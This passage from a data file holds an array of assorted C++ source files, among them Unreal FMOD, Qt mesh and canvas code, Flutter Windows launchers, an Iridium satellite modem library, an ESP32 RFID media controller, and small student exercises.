SoundActor->AudioComponent->Event;\n}\n\nvoid UFMODAmbientSoundActorFactory::PostCreateBlueprint(UObject *Asset, AActor *CDO)\n{\n    if (Asset != NULL && CDO != NULL)\n    {\n        UFMODEvent *Event = Cast<UFMODEvent>(Asset);\n\n        if (Event != NULL)\n        {\n            AFMODAmbientSound *NewSound = CastChecked<AFMODAmbientSound>(CDO);\n            NewSound->AudioComponent->Event = Event;\n        }\n    }\n}",
    "#include \"graphics/meshloader.h\"\n\n#define TINYOBJLOADER_IMPLEMENTATION\n#include \"util/tiny_obj_loader.h\"\n\n#include <iostream>\n\n#include <QString>\n#include <QFile>\n#include <QTextStream>\n#include <QRegularExpression>\n\nusing namespace Eigen;\n\nbool MeshLoader::loadTetMesh(const std::string &filepath, std::vector<Eigen::Vector3d> &vertices, std::vector<Eigen::Vector4i> &tets)\n{\n    QString qpath = QString::fromStdString(filepath);\n    QFile file(qpath);\n\n    if(!file.open(QIODevice::ReadOnly | QIODevice::Text)) {\n        std::cout << \"Error opening file: \" << filepath << std::endl;\n        return false;\n    }\n    QTextStream in(&file);\n\n    QRegularExpression vrxp(\"v (-?\\\\d*\\\\.?\\\\d+) +(-?\\\\d*\\\\.?\\\\d+) +(-?\\\\d*\\\\.?\\\\d+)\");\n    QRegularExpression trxp(\"t (\\\\d+) +(\\\\d+) +(\\\\d+) +(\\\\d+)\");\n\n    while(!in.atEnd()) {\n        QString line = in.readLine();\n        auto match = vrxp.match(line);\n        if(match.hasMatch()) {\n            vertices.emplace_back(match.captured(1).toDouble(),\n                                  match.captured(2).toDouble(),\n                                  match.captured(3).toDouble());\n            continue;\n        }\n        match = trxp.match(line);\n        if(match.hasMatch()) {\n            tets.emplace_back(match.captured(1).toInt(),\n                              match.captured(2).toInt(),\n                              match.captured(3).toInt(),\n                              match.captured(4).toInt());\n        }\n    }\n    file.close();\n    return true;\n}\n\nMeshLoader::MeshLoader()\n{\n\n}\n",
    "/*\n Given a singly linked list A\n\n A: A0 \u2192 A1 \u2192 \u2026 \u2192 An-1 \u2192 An \n\nreorder it to:\n\n A0 \u2192 An \u2192 A1 \u2192 An-1 \u2192 A2 \u2192 An-2 \u2192 \u2026 \n\nYou must do this in-place without altering the nodes' values. \n\n\n---\n\nSaawal to aisa hai ye recursion vibe de raha hai pahle to.\n\n1. [1, 2, 3, 4, 5]\n=> [1, 5, 2, 4, 3]\n\n2. [1, 2, 3, 4]\n=> [1, 4, 2, 3]\n\nto kya karo ki 2nd last par jao aur uske next ko first ke next par point karao baki store karlo aur uske liye recursion call kar do aur generated value ko 1 -> 4 -> reorderList(baki ka aise kar do)\n\n1 -> 2 -> 3 -> 4\n1 -> 2 && 4 -> 3\n\n>================================|>\n\nQ:  1 -> 2 -> 3 -> 4 -> 5\n=>  1 -> 5 -> 2 -> 4 -> 3\n\n1 -> 4 -> 2 -> 3\n\n\ncalculate size: mid ke baad wale saare nodes ko stack me dalo\n\n\n1 5 2 4 3 \n\n>================================|>\n\n\n*/\n\n\n#include <bits/stdc++.h>\nusing namespace std;\n\nstruct ListNode {\n    int val;\n    ListNode *next;\n    ListNode(int x) : val(x), next(NULL) {}\n};\n\nListNode *reorderList(ListNode *A) {\n    stack<ListNode*> stack;\n\n    int size = 0;\n    ListNode *curr = A;\n    while (curr != NULL) {\n        size++;\n        curr = curr->next;\n    }\n\n    if (size <= 2) return A;\n\n    int midIndex = size / 2;\n    curr = A;\n    for (int i = 0; i < midIndex; i++) {\n        ListNode *temp = curr->next;\n        if (i == midIndex - 1) curr->next = NULL;\n        curr = temp;\n    }\n\n    while (curr != NULL) {\n        stack.push(curr);\n        curr = curr->next;\n    }\n\n    ListNode *prev = NULL;\n    curr = A;\n    for (int i = 0; i < midIndex; i++) {\n        ListNode *temp = curr->next;\n        ListNode *new_node = stack.top();\n        stack.pop();\n        curr->next = new_node;\n        new_node->next = temp;\n\n        prev = new_node;\n        curr = temp;\n    }\n\n    if (!stack.empty()) {\n        prev->next = stack.top();\n        stack.pop();\n        prev = prev->next;\n    }\n\n    if (prev != NULL) prev->next = NULL;\n\n    return A;\n}\n\nint main() {\n    return 0;\n}",
    "#include \"Canvas.h\"\n#include <QPainter>\n#include <QMimeData>\n#include <QFileInfo>\n#include <QImageReader>\n\nCanvas::Canvas(QWidget* parent) : QWidget(parent), paintingEnabled(false)\n{\n\tbrushSize = 10;\n\tsetAcceptDrops(true);\n}\n\nvoid Canvas::loadImg(const QString& imgPath)\n{\n\toriginalImage.load(imgPath);\n\tinit();\n\temit OnImageSet();\n}\n\nvoid Canvas::loadImg(const QImage& img)\n{\n\toriginalImage = img.copy();\n\tinit();\n\temit OnImageSet();\n}\n\nvoid Canvas::setPaintingEnabled(bool enabled)\n{\n\tpaintingEnabled = enabled;\n}\n\nvoid Canvas::clearStrokes()\n{\n\tmaskImage = QImage(originalImage.size(), QImage::Format_ARGB32_Premultiplied);\n\tmaskImage.fill(Qt::transparent);\n\tupdate();\n}\n\nQImage Canvas::getImg() const\n{\n\treturn originalImage;\n}\n\nQImage Canvas::getMask() const\n{\n\treturn maskImage;\n}\n\nvoid Canvas::paintEvent(QPaintEvent* event)\n{\n\tQPainter painter(this);\n\tpainter.setRenderHint(QPainter::SmoothPixmapTransform);\n\tpainter.setRenderHint(QPainter::Antialiasing);\n\tpainter.drawImage(0, 0, displayedImage);\n\n\tif (!paintingEnabled)\n\t\treturn;\n\n\tQImage scaledMask = maskImage.scaled(460, 460, Qt::KeepAspectRatio, Qt::SmoothTransformation);\n\tpainter.setOpacity(0.65f);\n\tpainter.drawImage(0, 0, scaledMask);\n\tpainter.setOpacity(1.0f);\n}\n\nvoid Canvas::mousePressEvent(QMouseEvent* event)\n{\n\tif (!paintingEnabled) return;\n\tlastPoint = event->pos();\n}\n\nvoid Canvas::mouseMoveEvent(QMouseEvent* event)\n{\n\tif (!paintingEnabled || !(event->buttons() & Qt::LeftButton)) return;\n\n\tdouble scaleFactorX = static_cast<double>(originalImage.width() / displayedImage.width());\n\tdouble scaleFactorY = static_cast<double>(originalImage.height() / displayedImage.height());\n\n\tQPoint scaledLastPoint(lastPoint.x() * scaleFactorX, lastPoint.y() * scaleFactorY);\n\tQPoint scaledCurPoint(event->pos().x() * scaleFactorX, event->pos().y() * scaleFactorY);\n\n\tQPainter painter(&maskImage);\n\n\tQPen pen(QColor(255, 255, 255, 255), (brushSize + 4) * scaleFactorX, Qt::SolidLine, Qt::RoundCap, Qt::RoundJoin);\n\tpainter.setPen(pen);\n\tpainter.drawLine(scaledLastPoint, scaledCurPoint);\n\n\tlastPoint = event->pos();\n\tupdate();\n}\n\nvoid Canvas::mouseReleaseEvent(QMouseEvent* event)\n{\n\tif (!paintingEnabled) return;\n}\n\nvoid Canvas::enterEvent(QEnterEvent* event)\n{\n\tQWidget::enterEvent(event);\n\tif (!paintingEnabled) return;\n\tsetCustomCursor();\n}\n\nvoid Canvas::leaveEvent(QEvent* event)\n{\n\tQWidget::leaveEvent(event);\n\tunsetCursor();\n}\n\nvoid Canvas::dragEnterEvent(QDragEnterEvent* event)\n{\n\tif (event->mimeData()->hasUrls() && !event->mimeData()->urls().isEmpty()) {\n\t\tQList<QUrl> urls = event->mimeData()->urls();\n\t\tfor (const QUrl& url : urls) {\n\t\t\tQFileInfo fileInfo(url.toLocalFile());\n\t\t\tif (fileInfo.exists() && fileInfo.isFile() &&\n\t\t\t\tQImageReader::imageFormat(fileInfo.filePath()).isEmpty() == false) {\n\t\t\t\tevent->acceptProposedAction();\n\t\t\t\treturn;\n\t\t\t}\n\t\t}\n\t}\n}\n\nvoid Canvas::dropEvent(QDropEvent* event)\n{\n\tconst QMimeData* mimeData = event->mimeData();\n\tif (mimeData->hasUrls())\n\t{\n\t\tQList<QUrl> urls = mimeData->urls();\n\t\tfor (const QUrl& url : urls)\n\t\t{\n\t\t\tQString filePath = url.toLocalFile();\n\t\t\tQFileInfo fileInfo(filePath);\n\t\t\tif (fileInfo.exists() && fileInfo.isFile() && QImageReader::imageFormat(filePath).isEmpty() == false)\n\t\t\t{\n\t\t\t\tloadImg(filePath);\n\t\t\t\tevent->acceptProposedAction();\n\t\t\t\treturn;\n\t\t\t}\n\t\t}\n\t}\n}\n\nvoid Canvas::wheelEvent(QWheelEvent* event)\n{\n\tconst int delta = event->angleDelta().y();\n\tif (delta > 0)\n\t{\n\t\tbrushSize += 2;\n\t}\n\telse if (delta < 0 && brushSize > 2)\n\t{\n\t\tbrushSize -= 2;\n\t}\n\n\tsetCustomCursor();\n\tevent->accept();\n}\n\nvoid Canvas::init()\n{\n\tdisplayedImage = originalImage.scaled(460, 460, Qt::KeepAspectRatio, Qt::SmoothTransformation);\n\tsetMinimumSize(displayedImage.size());\n\n\tmaskImage = QImage(originalImage.size(), QImage::Format_ARGB32_Premultiplied);\n\tmaskImage.fill(Qt::transparent);\n\tupdate();\n}\n\nvoid Canvas::setCustomCursor()\n{\n\tQPixmap pixmap(brushSize * 2 + 2, brushSize * 2 + 2);\n\tpixmap.fill(Qt::transparent);\n\n\tQPainter painter(&pixmap);\n\tpainter.setRenderHint(QPainter::Antialiasing);\n\tQPen pen(Qt::white, 2);\n\tpainter.setPen(pen);\n\tpainter.setBrush(Qt::NoBrush);\n\tpainter.drawEllipse(1, 1, brushSize * 2 - 1, brushSize * 2 - 1);\n\n\tQCursor cursor(pixmap);\n\tsetCursor(cursor);\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"shopping_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <algorithm>\nusing namespace std;\n\n\nbool check_if_sorted(string str);\nvector<int> stringToNumberVector(const string& numberString, char separator);\n\nvector<string> stringToWordsVector(const string &sentence, char separator);\nvector<string> stringToWordsVector(string &sentence);//seperotor is ' ' eg. This is a school. \n\n\nbool ignore_case(char a, char b){\n\t// Converts both characters to lowercase and checks if a <= b\n\treturn (tolower(a) <= tolower(b));\n}\n\nbool check_if_sorted(string str){\n\treturn is_sorted(str.begin(), str.end(), ignore_case);\n}\n\n\nvector<int> stringToNumberVector(const string& numberString, char separator) {\n    vector<int> numbers;\n    stringstream ss(numberString);\n    string token;\n\n    while (getline(ss, token, separator)) {\n        int number = stoi(token);\n        numbers.push_back(number);\n    }\n\n    return numbers;\n}\n\nvector<string> stringToWordsVector(const string &sentence, char separator) {\n    vector<string> result;\n    stringstream ss(sentence);\n    string item;\n    \n    while (getline(ss, item, separator)) {\n        result.push_back(item);\n    }\n\n    return result;\n}\n\nvector<string> stringToWordsVector(string &sentence) {\n    vector<string> v;\n    istringstream iss(sentence);\n    string word;\n    \n    while (iss >> word) {\n        v.push_back(word);\n    }\n\n    return v;\n}\n\nint main(){\n\t\n\tstring str = \"AdHorSwZ\";\n\n\t\n\tif (check_if_sorted(str)) {\n\t\tcout << \"Sorted\";\n\t}\n\telse {\n\t\tcout << \"Not sorted\";\n\t}\n\n\treturn 0;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"apitrial\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/*\nIridiumSBD - An Arduino library for Iridium SBD (\"Short Burst Data\") Communications\nSuggested and generously supported by Rock Seven Location Technology\n(http://rock7mobile.com), makers of the brilliant RockBLOCK satellite modem.\nCopyright (C) 2013-2017 Mikal Hart\nAll rights reserved.\n\nThe latest version of this library is available at http://arduiniana.org.\n\nThis library is free software; you can redistribute it and/or\nmodify it under the terms of the GNU Lesser General Public\nLicense as published by the Free Software Foundation; either\nversion 2.1 of the License, or (at your option) any later version.\n\nThis library is distributed in the hope that it will be useful,\nbut WITHOUT ANY WARRANTY; without even the implied warranty of\nMERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU\nLesser General Public License for more details.\n\nYou should have received a copy of the GNU Lesser General Public\nLicense along with this library; if not, write to the Free Software\nFoundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA\n*/\n\n#include <time.h>\n#include \"IridiumSBD.h\"\n\n\nbool ISBDCallback() __attribute__((weak));\nvoid ISBDConsoleCallback(IridiumSBD *device, char c) __attribute__((weak));\nvoid ISBDDiagsCallback(IridiumSBD *device, char c) __attribute__((weak));\n\nbool ISBDCallback() { return true; }\nvoid ISBDConsoleCallback(IridiumSBD *device, char c) { }\nvoid ISBDDiagsCallback(IridiumSBD *device, char c) { }\n\n// Power on the RockBLOCK or return from sleep\nint IridiumSBD::begin()\n{\n   if (this->reentrant)\n      return ISBD_REENTRANT;\n\n   this->reentrant = true;\n   int ret = internalBegin();\n   this->reentrant = false;\n\n   // Absent a successful startup, keep the device turned off\n   if (ret != ISBD_SUCCESS)\n      power(false);\n\n   return ret;\n}\n\n// Transmit a binary message\nint IridiumSBD::sendSBDBinary(const uint8_t *txData, size_t txDataSize)\n{\n   if (this->reentrant)\n      return ISBD_REENTRANT;\n\n   this->reentrant = true;\n   int ret = internalSendReceiveSBD(NULL, txData, txDataSize, NULL, NULL);\n   this->reentrant = false;\n   return ret;\n}\n\n// Transmit and receive a binary message\nint IridiumSBD::sendReceiveSBDBinary(const uint8_t *txData, size_t txDataSize, uint8_t *rxBuffer, size_t &rxBufferSize)\n{\n   if (this->reentrant)\n      return ISBD_REENTRANT;\n\n   this->reentrant = true;\n   int ret = internalSendReceiveSBD(NULL, txData, txDataSize, rxBuffer, &rxBufferSize);\n   this->reentrant = false;\n   return ret;\n}\n\n// Transmit a text message\nint IridiumSBD::sendSBDText(const char *message)\n{\n   if (this->reentrant)\n      return ISBD_REENTRANT;\n\n   this->reentrant = true;\n   int ret = internalSendReceiveSBD(message, NULL, 0, NULL, NULL);\n   this->reentrant = false;\n   return ret;\n}\n\n// Transmit a text message and receive reply\nint IridiumSBD::sendReceiveSBDText(const char *message, uint8_t *rxBuffer, size_t &rxBufferSize)\n{\n   if (this->reentrant)\n      return ISBD_REENTRANT;\n\n   this->reentrant = true;\n   int ret = internalSendReceiveSBD(message, NULL, 0, rxBuffer, &rxBufferSize);\n   this->reentrant = false;\n   return ret;\n}\n\n// High-level wrapper for AT+CSQ\nint IridiumSBD::getSignalQuality(int &quality)\n{\n   if (this->reentrant)\n      return ISBD_REENTRANT;\n\n   this->reentrant = true;\n   int ret = internalGetSignalQuality(quality);\n   this->reentrant = false;\n   return ret;\n}\n\n// Gracefully put device to lower power mode (if sleep pin provided)\nint IridiumSBD::sleep()\n{\n   if (this->reentrant)\n      return ISBD_REENTRANT;\n\n   if (this->sleepPin == -1)\n      return ISBD_NO_SLEEP_PIN;\n\n   this->reentrant = true;\n   int ret = internalSleep();\n   this->reentrant = false;\n\n   if (ret == ISBD_SUCCESS)\n      power(false); // power off\n   return ret;\n}\n\n// Return sleep state\nbool IridiumSBD::isAsleep()\n{\n   return this->asleep;\n}\n\n// Return number of pending messages\nint IridiumSBD::getWaitingMessageCount()\n{\n   return this->remainingMessages;\n}\n\n// Define capacitor recharge times\nvoid IridiumSBD::setPowerProfile(POWERPROFILE profile) // 0 = direct connect (default), 1 = USB\n{\n   switch(profile)\n   {\n   case DEFAULT_POWER_PROFILE:\n      this->sbdixInterval = ISBD_DEFAULT_SBDIX_INTERVAL;\n      break;\n\n   case USB_POWER_PROFILE:\n      this->sbdixInterval = ISBD_USB_SBDIX_INTERVAL;\n      break;\n   case CUSTOM_POWER_PROFILE:\n      this->sbdixInterval = ISBD_CUSTOM_SBDIX_INTERVAL;\n      break;\n   }\n}\n\n// Tweak AT timeout \nvoid IridiumSBD::adjustATTimeout(int seconds)\n{\n   this->atTimeout = seconds;\n}\n\n// Tweak Send/Receive SBDIX process timeout\nvoid IridiumSBD::adjustSendReceiveTimeout(int seconds)\n{\n   this->sendReceiveTimeout = seconds;\n}\n\nvoid IridiumSBD::useMSSTMWorkaround(bool useWorkAround) // true to use workaround from Iridium Alert 5/7 \n{\n   this->msstmWorkaroundRequested = useWorkAround;\n}\n\nvoid IridiumSBD::enableRingAlerts(bool enable) // true to enable SBDRING alerts and RING signal pin\n{\n   this->ringAlertsEnabled = enable;\n   if (enable)\n      this->ringAsserted = false;\n}\n\nbool Iri",
    "#include <SPI.h>\n#include <WiFi.h>\n#include <HTTPClient.h>\n#include <MFRC522.h>\n#include <TFT_eSPI.h>\n#include <ArduinoJson.h>\n\n// // Include the jpeg decoder library\n#include <TJpg_Decoder.h>\n\n// // Include LittleFS\n#include <FS.h>\n#include \"LittleFS.h\"\n\n// // Call up the SPIFFS FLASH filing system this is part of the ESP Core\n// #include \"LittleFS.h\" // ESP32 only\n// #include \"SPIFFS.h\"   // ESP32 only\n\n// JPEG decoder library\n// #include <JPEGDecoder.h>\n\n// Replace with your network credentials\nconst char *ssid = \"marvin\";\nconst char *password = \"gumboots\";\n\n// API endpoint URL\nconst String serverName = \"http://192.168.0.2:8000\";\n\n#define SDA_PIN 33\n#define SCK_PIN 25\n#define MISO_PIN 27\n#define MOSI_PIN 26\n#define RST_PIN 17\n\n#define BUTTON1PIN 35\n#define BUTTON2PIN 0\n\nMFRC522 mfrc522(SDA_PIN, RST_PIN);\n\n// Create an instance of the TFT_eSPI class\nTFT_eSPI tft = TFT_eSPI();\n\nstruct MovieInfo\n{\n  String title;\n  String thumbUrl;\n  String thumbFilename;\n  unsigned int duration;\n  bool hasThumbnail;\n  String uid;\n  bool cardNotFound;\n};\n\nMovieInfo currentMovie;\n\nstruct PlayerState\n{\n  bool isPlaying;\n  String title;\n  int currentTime;\n  int duration;\n};\n\nvoid getPlayerState(PlayerState *s)\n{\n  HTTPClient http;\n  // Serial.println(\"Checking status of media\");\n  http.begin(serverName + \"/status\"); // Specify the URL\n  http.setConnectTimeout(500);\n  http.setTimeout(500);              // Set timeout to 500ms\n  int httpResponseCode = http.GET(); // Make GET request\n\n  if (httpResponseCode > 0)\n  {\n    String payload = http.getString(); // Get the response payload\n\n    StaticJsonDocument<200> doc;\n\n    // Serial.println(httpResponseCode);\n    // Serial.println(payload);\n\n    DeserializationError error = deserializeJson(doc, payload);\n    if (error)\n    {\n      Serial.print(F(\"deserializeJson() failed: \"));\n      Serial.println(error.f_str());\n      tft.drawString(\"JSON Parse Error\", 10, 40);\n      return;\n    }\n\n    // Serial.println(\"deserializeJson() succeeded!\");\n\n    s->title = doc[\"title\"].as<const char *>();\n    s->isPlaying = doc[\"is_playing\"];\n    s->currentTime = doc[\"current_time\"];\n    s->duration = doc[\"duration\"];\n  }\n  else\n  {\n    Serial.print(\"Error fetching player status: \");\n    Serial.println(httpResponseCode);\n  }\n  http.end();\n}\n\nvoid playOrPause(PlayerState *s)\n{\n  String action;\n  if (s->isPlaying)\n  {\n    action = \"pause\";\n    Serial.println(\"Sending pause command\");\n  }\n  else\n  {\n    action = \"resume\";\n    Serial.println(\"Sending resume command\");\n  }\n  HTTPClient http;\n  http.begin(serverName + \"/\" + action); // Specify the URL\n  http.addHeader(\"content-type\", \"application/json\");\n  int httpResponseCode = http.POST(\"{}\"); // Make POST request\n}\n\nvoid startMovie(PlayerState *s, String movie)\n{\n  HTTPClient http;\n  http.begin(serverName + \"/play\"); // Specify the URL\n  http.addHeader(\"content-type\", \"application/json\");\n  String payload = \"{\\\"movie_name\\\": \\\"\" + movie + \"\\\"}\";\n  Serial.println(\"Start movie with payload \" + payload);\n  int httpResponseCode = http.POST(payload); // Make POST request\n  Serial.println(\"Response code: \" + String(httpResponseCode));\n}\n\nvoid stopMovie()\n{\n  HTTPClient http;\n  http.begin(serverName + \"/stop\"); // Specify the URL\n  http.addHeader(\"content-type\", \"application/json\");\n  int httpResponseCode = http.POST(\"{}\"); // Make POST request\n  Serial.println(\"Response code: \" + String(httpResponseCode));\n}\n\nvoid loadPhoto()\n{\n  // Get the width and height in pixels of the jpeg if you wish\n  uint16_t w = 0, h = 0;\n  TJpgDec.getFsJpgSize(&w, &h, \"/self.jpg\", LittleFS); // Note name preceded with \"/\"\n  // Serial.print(\"Width = \");\n  // Serial.print(w);\n  // Serial.print(\", height = \");\n  // Serial.println(h);\n\n  // Draw the image, top left at 0,0\n  TJpgDec.drawFsJpg(0, 0, \"/self.jpg\", LittleFS);\n}\n\nTFT_eSprite sprite = TFT_eSprite(&tft);\n\nvoid showPlayerState(PlayerState *s)\n{\n  // Create a sprite to reduce flickering\n\n  sprite.createSprite(tft.width(), tft.height());\n  sprite.fillSprite(TFT_BLACK);\n  // tft.fillScreen(TFT_BLACK);\n\n  if (currentMovie.hasThumbnail)\n  {\n    TJpgDec.drawFsJpg(0, 0, currentMovie.thumbFilename, LittleFS);\n  }\n\n  sprite.setTextColor(TFT_WHITE);\n  sprite.setTextSize(2);\n\n  // loadPhoto();\n\n  String line1 = \"\";\n  String line2 = \"\";\n\n  if (currentMovie.cardNotFound)\n  {\n    line1 = \"Register Card:\";\n    line2 = currentMovie.uid;\n  }\n  else if (s->title == NULL)\n  {\n    Serial.println(\"No media playing on device\");\n    line1 = \"\";\n    line2 = \"No Media\";\n  }\n  else\n  {\n    char buffer[50];\n    // format the currentTime in hours and minutes\n    int hours = s->currentTime / 3600;\n    int minutes = (s->currentTime % 3600) / 60;\n    int seconds = s->currentTime % 60;\n    snprintf(buffer, sizeof(buffer), \"%s %01d:%02d:%02d\", s->isPlaying ? \"P\" : \"S\", hours, minutes, seconds);\n\n    // snprintf(buffer, sizeof(buffer), \"%s: %d/%d\", s->isPlaying ? \"P\" : \"S\", s->currentTime / 60, s->duration / 60);\n    line1 = s->title;\n    line2 = buffer;\n  }\n\n  //",
    "#include <bits/stdc++.h>\r\n#include <iostream>\r\n#include<cstdlib>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\n    int option, num_scope, given_num, guess_num, count = 0;\r\n    start:\r\n    cout<<\"-------------------------------------------------------------------------\"<<endl;\r\n    cout<<\"-------------------- WELCOME TO NUMBER GUESSING GAME --------------------\"<<endl;\r\n    cout<<\"-------------------------------------------------------------------------\"<<endl;\r\n    cout<<\"<--- Choose one option from below ---> \"<<\"\\n\"<<endl;\r\n    cout<<\"1.>>> Play the Game >>>\"<<endl;\r\n    cout<<\"2.>>> See the last Game Score >>>\"<<endl;\r\n    cout<<\"3.>>> Exit the Game >>>\"<<endl;\r\n    cout<<\"\\n\"<<\"Enter Your Option : \";\r\n    cin>>option;\r\n    switch(option)\r\n    {\r\n        case 1:\r\n            cout<<\"\\n\"<<\"Let's Start the Game...\"<<\"\\n\"<<endl;\r\n            goto play;\r\n            break;\r\n        case 2:\r\n            if(count == 0)\r\n            {\r\n                cout<<\"\\n\"<<\"You haven't played the game even once yet...\"<<\"\\n\"<<endl;\r\n            }\r\n            else if(count == 1)\r\n            {\r\n                cout<<\"\\n\"<<\"In the Last Game, you won the game in \"<<count<<\"st Try...! Nice one!\"<<\"\\n\"<<endl;\r\n            }\r\n            else\r\n            {\r\n                cout<<\"\\n\"<<\"In the Last Game, you won the game in \"<<count<<\" Tries...\"<<\"\\n\"<<endl;\r\n            }\r\n            goto start;\r\n            break;\r\n        case 3:\r\n            cout<<\"\\n\"<<\"Thanks for Playing the Game...!\"<<\"\\n\"<<endl;\r\n            exit(0);\r\n            break;\r\n        default:\r\n            cout<<\"\\n\"<<\"Invalid Option Selection... Please Try Again...\"<<\"\\n\"<<endl;\r\n            goto start;\r\n    }\r\n    play:\r\n    count = 1;\r\n    cout<<\"-------------------------- NUMBER GUESSING GAME -------------------------\"<<endl;\r\n    cout<<\"\\n\"<<\"Enter what would you like the range of the numbers to be? : \";\r\n    cin>>num_scope;\r\n    srand(time(0));\r\n    given_num = rand() % (num_scope+1);\r\n    do\r\n    {\r\n        cout<<\"\\n\"<<\"Enter your guess number : \";\r\n        cin>>guess_num;\r\n        if(guess_num > given_num)\r\n        {\r\n            count += 1;\r\n            cout<<\"The number is lower than you guess...\";\r\n        }\r\n        else if(guess_num < given_num)\r\n        {\r\n            count += 1;\r\n            cout<<\"The number is higher than you guess...\";\r\n        }\r\n        else\r\n        {\r\n            cout<<\"\\n\"<<\"Great.! You guessed the correct number...!!!\";\r\n            if(count == 1)\r\n            {\r\n                cout<<\"\\n\"<<\"You guessed the number in \"<< count <<\"st Try.!!!\"<<\"\\n\"<<endl;\r\n            }\r\n            else\r\n            {\r\n                cout<<\"\\n\"<<\"You guessed the number in \"<< count <<\" Tries...!\"<<\"\\n\"<<endl;\r\n            }\r\n            goto start;\r\n        }\r\n    }\r\n    while(guess_num != given_num);\r\n    \r\n\r\n    return 0;\r\n}",
    "#include <iostream>\n#include <cstring>\n\nusing namespace std;\n\nconst int MAX_STUDENTS = 10;\nconst int MAX_COURSES = 10;\n\nclass Student {\npublic:\n    int id;\n    char name[50];\n    char program[30];\n    float gpa;\n\n    void input() {\n        cout << \"Enter ID: \" ;\n        cin >> id;\n        cin.ignore();\n        cout<<\" Enter your NAME: \"<<endl;\n        cin.getline(name, 50);\n        cout<<\"Enter your PROGRAM: \"<<endl;\n        cin.getline(program, 30);\n        cout<<\"Enter your gpa: \"<<endl;\n        cin >> gpa;\n    }\n\n    void display() const {\n        cout << \"ID: \" << id << \", Name: \" << name << \", Program: \" << program << \", GPA: \" << gpa << endl;\n    }\n};\n\nclass Course {\npublic:\n    int code;\n    char name[50];\n    int credits;\n\n    void input() {\n        cout << \"Enter your course code \"<<endl;\n        cin >> code;\n        cin.ignore();\n        cout<<\"Enter your course name \"<<endl;\n        cin.getline(name, 50);\n        cout<<\"Enter your course credits \"<<endl;\n        cin >> credits;\n    }\n\n    void display() const {\n        cout << \"Code: \" << code << \", Name: \" << name << \", Credits: \" << credits << endl;\n    }\n};\n\nStudent students[MAX_STUDENTS];\nCourse courses[MAX_COURSES];\nint numStudents = 0;\nint numCourses = 0;\n\nvoid addStudent() {\n    if (numStudents == MAX_STUDENTS) {\n        cout << \"Error: Maximum number of students reached!\" << endl;\n        return;\n    }\n    students[numStudents].input();\n    numStudents++;\n    cout << \"Student added successfully!\" << endl;\n}\n\nvoid displayStudents() {\n    if (numStudents == 0) {\n        cout << \"No students found!\" << endl;\n        return;\n    }\n    for (int i = 0; i < numStudents; i++) {\n        students[i].display();\n    }\n}\n\nvoid searchStudent() {\n    if (numStudents == 0) {\n        cout << \"No students found!\" << endl;\n        return;\n    }\n    int searchID;\n    cout << \"Enter student ID to search: \";\n    cin >> searchID;\n    for (int i = 0; i < numStudents; i++) {\n        if (students[i].id == searchID) {\n            cout << \"Student found: \";\n            students[i].display();\n            return;\n        }\n    }\n    cout << \"Student with ID \" << searchID << \" not found.\" << endl;\n}\n\nvoid updateStudent() {\n    if (numStudents == 0) {\n        cout << \"No students found!\" << endl;\n        return;\n    }\n    int updateID;\n    cout << \"Enter student ID to update: \";\n    cin >> updateID;\n    for (int i = 0; i < numStudents; i++) {\n        if (students[i].id == updateID) {\n            cout << \"Enter new information:\" << endl;\n            students[i].input();\n            cout << \"Student information updated.\" << endl;\n            return;\n        }\n    }\n    cout << \"Student with ID \" << updateID << \" not found.\" << endl;\n}\n\nvoid deleteStudent() {\n    if (numStudents == 0) {\n        cout << \"No students found!\" << endl;\n        return;\n    }\n    int deleteID;\n    cout << \"Enter student ID to delete: \";\n    cin >> deleteID;\n    for (int i = 0; i < numStudents; i++) {\n        if (students[i].id == deleteID) {\n            for (int j = i; j < numStudents - 1; j++) {\n                students[j] = students[j + 1];\n            }\n            numStudents--;\n            cout << \"Student with ID \" << deleteID << \" deleted.\" << endl;\n            return;\n        }\n    }\n    cout << \"Student with ID \" << deleteID << \" not found.\" << 